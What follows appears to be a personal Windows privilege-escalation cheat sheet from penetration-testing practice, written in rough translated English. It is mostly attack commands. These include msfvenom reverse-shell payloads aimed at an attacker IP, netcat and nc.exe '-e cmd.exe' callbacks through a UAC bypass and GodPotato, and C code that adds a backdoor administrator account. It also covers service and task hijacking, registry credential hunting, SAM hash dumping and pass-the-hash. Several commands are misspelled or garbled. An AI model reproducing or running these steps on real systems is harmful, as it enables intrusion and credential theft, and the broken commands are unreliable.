# Preparation
1º Create a reverse shell with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPATACANTE LPORT=53 -f exe -o reverse.exe`.


2º In our kali linux we make a server with impacket
	location of impacket tools `/usr/share/doc/python3-impacket/examples`
	impacket server command
	`python3 smbserver.py test /home/bardock`.

3rd Way to connect to copy files
`copy `FILE C:ROUTE`.

3.5º To be copied from windwos to linux
`copy FILE C:\FILE `.

4º Shell with Netcat 
`nc -nvlp 53`.


1º Open web server
`python -m http.server 80`

2º Copy web file
`certutil -f -urlcache -split http://IP/archivo file`

## RDP connection
1º Add to admins group the user
`net localgroup <username> /add`
2º Using PsExec remote connection
`tool PsExec: .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe`


# Avoid Rabbit Holes
If when using `sc query / sc qc` and we see that we don't have the privileges of

`SERVICE_START and SERVICE_STOP`

This service is excluded from the exploits

### Turn off and turn on services
1st net.exe
~~~~c
net stop / start SERVICE
~~~~

2º sc.exe
~~~~c
sc.exe stop / start SERVICE
~~~~


# Recommendations/ Tips
# Manual Enumeration
Enumerate system information
~~~~c
>> systemminfo
~~~~

Enumerate patches (kernel exploits)
~~~~c
>> wmic qce
~~~~

List user data
~~~~c
>> whoami /all
Enumerate user privileges
>> whoami /priv
~~~~

List users with net user, groups etc.
~~~~c
>> net user <user>
~~~~

List local users
~~~~c
>> Get-LocalUser
~~~~

Enumerate local groups
~~~~c
>> Get-LocalGroup
~~~~

Enumerate Users in certain groups
~~~~c
>> Get-LocalGroupMember GROUP
~~~~


Search Firewall Information
~~~~c
>> sc query windefend
~~~~

Run commands with privileges of other users
~~~~c
>> runas.exe /netonly /user:<domain> <username> cmd.exe
~~~~

Connection via evil-winrm (winrm must be active)
~~~~c
>> evil-winrm -i IP -u USER -p PASSWORD
~~~~

Enumeration of files in directory C:\users
~~~~c
Get-ChildItem -Path C:\Users -Include *.txt,*.log,*.ini,*.kdbx,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
~~~~

Windows History
~~~~c
(Get-PSReadlineOption).HistorySavePath
~~~~



# Automatic Enumeration 
Enumeration with winPEASany (Select fast searchfast cmd for normal and cmd windowscreds to search for passwords)
~~~~c
>>.\winPEASany.exe fast searchfast cmd windowscreds
~~~~

Use PowerUp instead of winPEASany
~~~~c
Import PowerUp
Import-Module .\PowerUp.ps1

Run PowerUp.ps1
Invoke-AllChecks
~~~~


Use SharpUp
~~~~c
SharpUp.exe audit
~~~~

# Credentials
Look at the output of the automatic enumeration tool.
Otherwise go to manual commands

Use Lazagne to search for credentials on 
~~~~c
laZagne.exe all
~~~~


## Reused passwords
Search by tool output if they have been reused again




## Credentials in configuration files
Search for configuration files with the automatic enumeration tool

Search for passwords contained in files
~~~~c
>> findstr /si password *.txt (we can specify the extension)
~~~~

In powershell
~~~~c
Get-ChildItem -Path C:\Users -Include *.txt,*.log,*.ini,*.kdbx,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
~~~~


## Credentials in DB
Search it with the automatic enumerator

## cmdkey credentials
Check saved credentials
~~~~c
>> cmdkey /list
~~~~

Run reverse shell with user's saved credentials
~~~~c
>> runas /savecred /user:USER C:PATH of the reverse shell
~~~~


## Registry credentials
Search for passwords in the machine registry
~~~~c
>> reg query HKLM /f password /t REG_SZ /s
~~~~

Search for user registry passwords
~~~~c
>> reg query HKCU /f password /t REG_SZ /s
~~~~

Autologon credentials
~~~~c
>> reg query “HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon”
~~~~

Credentials saved in VNC
~~~~c
>> reg query “HKCU\Software\ORL\WinVNC3\Password”
~~~~

Credentials in SNMP parameters
~~~~c
>> reg query “HKLM ‘System’ query ‘HKLM ’Control Control” “SNMP Services” query
~~~~

Credentials in Putty
~~~~c
>> reg query “HKCU\Software\SimonTatham\PuTTY\Sessions”
~~~~

## Unattended or Sysprep file credentials
To be filled in
Unnatended.xml file
## Log file credentials
To be filled in

## User groups
To be populated 

## Exploits

## Services running on Localhost
List running services using the automatic tool and run searchsploit

## Kernel version
1º Search for existing patches
~~~~c
>> wmic qce
~~~~

2º Search in Searchsploit for any kernel exploit

## Software Version
The automatic enumerator warns us if it is not filled soon.

## Service version
We will search for the services and version, this will be filled in soon.
## De-configurations

## User Privileges

Check the user privileges
~~~~c
>> whoami /priv
~~~~

## Services


### Unquoted Service Path

1º Using the automatic enumerator that we have shows us an unquoted servce path

1º Enumerate manually the unquoted paths
~~~~c
>> wmic service get name,pathname,displayname,displayname,startmode | findstr /i auto | findstr /i /v “C:³” | findstr /i /v “”"”
~~~~

O

~~~~c
>> wmic service get name,pathname | findstr /i /v “C:\Windows\” | findstr /i /v “””
~~~~


2º Check the permissions that the service has
~~~~c
>> .\accesschk.exe /accepteula -ucqv SERVICE
“NOTE: Remember that the service has to have both START and STOP.”
~~~~


3º We check if our group has permission to manipulate the directory
NOTE: to create the name of the reverse shell we create it the same as the executable name
~~~~c
>>.\accesschk /accepteula -uwdq “C:\PATH”.
~~~~

4º We copy reverse shell in any part of the path decompressed
~~~~c
>> copy REVERSE “C:\PATH ‘C:\PATH\DEl ’SERVERVICE”
~~~~

5º Listener in kali `nc -nlvp 53`.
6º We stop and start the service `net stop SERVICE / net start SERVICE`.

### Weak Registry Permissions
1º invoke a powershell session 
~~~~c
>> powershell -exec bypass
~~~~

2º Ask the ACL what we can do with that service
~~~~c
>> Get-Acl PATH | Format-List
~~~~

3º We ask with accesschk the groups that have permissions
~~~~c
>> .\accesschk.exe /accepteula -uvwqk PATH
~~~~

4º We ask the actions that we can do to the service
~~~~c
>> .\accesschk.exe -ucqv SERVICE USER
~~~~

5º Ask the status of the service
~~~~c
>> sc query SERVICE
~~~~

6º Add (change) the registry path ImagePath and change it for our reverse shell
~~~~c
>> reg add PATH /v ImagePath /t REG_EXPAND /d C:\REVERSE /f
~~~~

7º Start listener with netcat

8º Restart the service `net stop SERVICE / net start SERVICE`.

### Insecure Service Permission
1º From what the enumeration tool gives us, we enumerate the services.

2º We ask the permissions that our user has in the service
~~~~c
>> .\accesschk.exe /accepteula -uwcqv USER SERVICE
~~~~

3º Ask the configuration of the service 
~~~~c
>> sc.exe qc SERVCIO
~~~~

4º Ask the status of the service 
~~~~c
sc.exe query SERVICE
~~~~

5º Exchange the binary for our reverse shell
~~~~c
>> sc.exe config SERVICE binpath= “\”"C:\REVERSE”
~~~~


### Insecure Service Executable
1º Search using the enumeration tool

2º Verify permissions of the binary
~~~~c
>> .accesschk.exe /accepteula -quvw PATH
~~~~
NOTE: So that it is effective it has to be in the group EVERYONE or a group that we are us.

3º To ask what we could do with the service
~~~~c
>> .\accesschk.exe /accepteula -uvqc SERVICE
~~~~
NOTE: It must have the 2 permissions e START / STOP

4º We copy the binary and we overwrite it for the original binary
~~~~c
>> copy /Y C:\REVERSE “C:\BINARIOori.exe”
~~~~


## AlwaysInstall Elevated
1º Check if we have the registers enabled
NOTE: Only works if we have the 2 registers enabled.
~~~~c
>> reg query HKLM\SOFTWARE\Microsoft\Windows\Installer /v SERVICE
~~~~
1.1º Verify the other registry
~~~~c
>> reg query HKCUSOFTWAREPoliciesMicrosoftWindowsInstaller /v SERVICE
~~~~

2º We create a reverse shell as file .msi
~~~~c
>>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPATACANTE LPORT=53 -f msi -o file.msi
~~~~

3º Copy the .msi to your computer
~~~~c
>> copy \IPtest.msi .
~~~~

4º We execute the file .msi
~~~~c
>> msiexec /quiet /qn /i file.msi
~~~~



## Scheduled Tasks
### Executable File Writeable

1st List all scheduled tasks that the user can view
~~~~c
schtasks /query /fo LIST /v
~~~~
In powershell
~~~~c
PS> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft”} | ft TaskName,TaskPath,State
~~~~

2º Verify the permissions that the user has for the task
~~~~c
>> .\accesschk.exe /accepteula -quv USER TASK
~~~~
NOTE: we have to find the permission FILE_APPEND_DATA and additionally the FILE_EXECUTE.

3º Copy the content of the reverse shell to the scheduled task
~~~~c
>> echo C:\PATH\DEDEREVERSE >> TASK
~~~~

4º We wait for it to be executed

### OFFSEC form

1º List all the scheduled tasks that the user can see
~~~~c
>> schtasks /query /fo LIST /v
~~~~

2º Check Privileges with icalcs
~~~~c
>> icacls “C:\PATH\DE\LA\tarea.exe”
~~~~

3º After creating the shell with the same name as the .exe of the task 1º rename the original binary and copy the malicious binary to that path

~~~~c
>> move .\PATHTAREA .binarioori.exe binarioori.exe.bak
>> move .\bianrioori.exe .\PATHTAREA
~~~~

### Dependency Writeable
To be filled in the future

### Reading sensitive files
### Reading SAM and SYSTEM
The SAM hive can be found in several locations
C:\Windows Repair
C:\Windows\System32\Config\RegBack

2º Dump the hashes 

3º By means of the samdump2 tool we read the hashes 
~~~~c
>> samdump2 SAM SYSTEM
~~~~
### Pass The Hash

1º With the hash of the user with the highest privielgios (admin or whatever)

2º Login with the credentials
~~~~c
>> pth-winexe -U 'USER%HASHDEUSERENTER' //IP cmd.exe
~~~~

2.1º Session with administrator
~~~~c
>> pth-winexe --system -U 'USER%HASH%USER' //IP cmd.exe
~~~~

Additional ## Installed Apps

## Installed Apps

1º List Running Programs
~~~~c
>> tasklist /V
~~~~

2º Search for non-standard processes in windows
~~~~c
>> .\Seatbelt.exe NonstandardProcesses
~~~~

3º Search for processes with winPEASany
~~~~c
>> .\winPEASany.exe quiet procesinfo
~~~~

4º From what we have found we search in exploitdb

## Service binary hijacking 

1º We look for binaries that are not running in its path in C:Windows system32
~~~~c
>> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
~~~~

2º Of the binaries that are not running in the windows path, we pass icacls to see if our group has permissions to manipulate it
~~~~c
>> icacls “PATH of the .exe”.
~~~~
Table of permissions according to mask
F: Full Access (Permission juicy)
M: Modify Access (Juicy Permission)
RX: Read and Execute access (no Juicy)
R: Read-Only Access (no juicy)
W: Write-Only Access (juicy)

3º We are going to use this code, what it does is to overwrite the binary and perform the described commands
~~~~c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system (“net user papilo password123! /add”);
  i = system (“net localgroup administrators papilo /add”);
  
  return 0;
}
~~~~

We compile the code and we transfer it
~~~~c
>> x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
~~~~

We transfer it to the windows machine (in kali there must be a server )
~~~~c
PS >> iwr -uri http://IP/adduser.exe -Outfile adduser.exe  
~~~~

Move the binary we want to hijack
~~~~c
>> move C:\xamppmysql.exe mysqld.exe mysqld.exe
>> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
~~~~

4º If the service that we try to hijack does not have the capacity to restart itself we are going to look for services that start automatically 

~~~~c
PS >> Get-CimInstance -ClassName win32_service | Select Name, StartMode 
~~~~

5º We go back to check the permissions and we do again the previous steps

Let's check if our user has permissions to restart the system
~~~~c

Privilege Name Description State
============================= ==================================== ========
SeSecurityPrivilege Manage auditing and security log Disabled
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
~~~~

In this case we don't have permissions, but if we had permissions we would restart the computer
~~~~c
PS >> shutdown /r /t 0
~~~~

And we wait for the code to do its work

# UAC BYPASS
For example we will use the binary fodhelper


1º In procmon look at the registry key that loads
![](https://github.com/shell-bomb/Notes/blob/main/WIndows/Images/Captura%20de%20pantalla%202024-09-04%20130858.png)

This will give us access to the information, to the path where is the binary
![](https://github.com/shell-bomb/Notes/blob/main/WIndows/Images/Captura%20de%20pantalla%202024-09-04%20130917.png)

1.1º Check the maifest: Maniest are information files about how the binary behaves.
![](https://github.com/shell-bomb/Notes/blob/main/WIndows/Images/Captura%20de%20pantalla%202024-09-04%20130929.png)
- mmc.exe will self-run depending on the snap-in .msc requested by the user. Most of the .msc files included with Windows will automatically elevate.
- Windows maintains an additional list of executables that are automatically elevated even if they are not requested in the manifest. This list includes, for example, pkgmgr.exe and spinstall.exe.
- COM objects can also request automatic elevation by configuring some registry keys.

There are 2 types of registry keys 
HKEY_LOCAL_MACHINE_Software_Classes >> System-wide file associations
HKEY_CURRENT_USERENT_USERSoftware\Classes >> Active User File Associations

In the machine we upload the binary nc.exe

2º Run it in a shell as admin
Run
C:\> set REG_KEY=HKCUSoftware\Classes settings-settings\Shell\Open\command
C:\> set CMD=“powershell -windowstyle hidden C:\> set CMD=”powershell -windowstyle hidden C:\Tools\nc64.exe IP PORT -e cmd.exe
With this we tell the registry key to associate the ms-settings class to the shell.

When we have chosen the registry key, we add the content of the reg_key to it.

3º 
We add the value “DelegateExetute” so that the windows ignores it and executes it

C:\> reg add %REG_KEY% /v “DelegateExecute” /d “” /f
C:\> reg add %REG_KEY% /d %CMD% /f


Clean the trace
Delete the associated registry key
reg delete HKCU\Software\Classesms-settings\ /f


Useful links
https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
https://github.com/hfiref0x/UACME
https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass
https://github.com/k4sth4/UAC-bypass

0º Test
~~~~c
powershell.exe Start-Process cmd.exe -Verb runAs
~~~~

0.1º Test
~~~~c
.\Win-Multi-UAC-Bypass.ps1
~~~~

1º Verify that the uac is active.
It should appear: Mandatory LabelMedium Mandatory Level

2º Upload uacme file

3º Use uacme with keys 23,33,34 y 70 with the absolute path of the reverse shell

# Recommended Tools

## Enumeration

1º winPEASany.exe
2º PowerUp
3º SharpUp
## Exploit

### Windows Explot suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Miscellaneous
1º Psexec64.exe 

### Non-standard processes
1º seatbelt

### Port Forwarding
1º plink.exe
2º Chisel

### Exploits 

[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng “https://github.com/bitsadmin/wesng”) 
# PrintsPoofer
~~~~c
PrintSpoofer.exe -i -c cmd.exe
~~~~

## God potato
1º Download the binary
2º Run 
~~~~c
.\GodPotato.exe -cmd “nc.exe -e cmd.exe IP PORT”.  
~~~~


LOCAL POTATO
Create binary evil.dll and replace it with WLBSCTRL.dll
Or PrintConfig.dll
